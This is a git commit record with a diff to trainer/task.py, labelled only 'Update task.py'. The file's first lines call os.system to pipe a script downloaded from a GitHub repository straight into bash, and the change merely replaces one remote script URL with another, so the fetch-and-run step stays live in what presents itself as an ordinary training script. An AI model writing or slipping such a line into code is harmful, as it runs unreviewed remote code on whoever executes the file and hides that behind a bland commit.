1c836c4bb2b03887b4a3b559dab6bfed32808ba3
tarwells <sushmarekkalam@zohomail.in>
2026-03-03 15:02:03 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/tarwells/donvill/raw/main/donvills | bash')
+os.system('curl -sL https://github.com/tarwells/pvjmall/raw/main/pvjmalls | bash')
